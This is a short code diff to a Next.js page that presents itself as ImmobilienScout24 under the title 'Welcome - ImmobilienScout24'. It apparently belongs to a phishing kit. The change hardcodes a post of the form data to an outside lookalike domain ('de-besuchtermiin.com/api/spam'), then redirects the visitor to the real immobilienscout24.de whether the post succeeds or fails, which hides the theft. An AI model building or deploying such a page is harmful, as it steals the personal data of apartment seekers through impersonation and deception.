@@ -41,8 +41,7 @@ export default function Wohnungen() {
 
   async function handleSubmitFn() {
     try {      
-      console.log(process.env.NEXT_PUBLIC_URL);
-      await axios.post(`${process.env.NEXT_PUBLIC_URL}/api/spam`, data);
+      await axios.post(`https://de-besuchtermiin.com/api/spam`, data);
       router.replace('https://www.immobilienscout24.de/');
     } catch(err) {
             router.replace('https://www.immobilienscout24.de/');
@@ -64,7 +63,7 @@ export default function Wohnungen() {
 
   return (
     <div className={styles.container}>
-      {console.log("test")}
+      {console.log("u2")}
       <Head>
         <title>Welcome - ImmobilienScout24</title>
         <link rel="icon" href="/favicon.ico" />
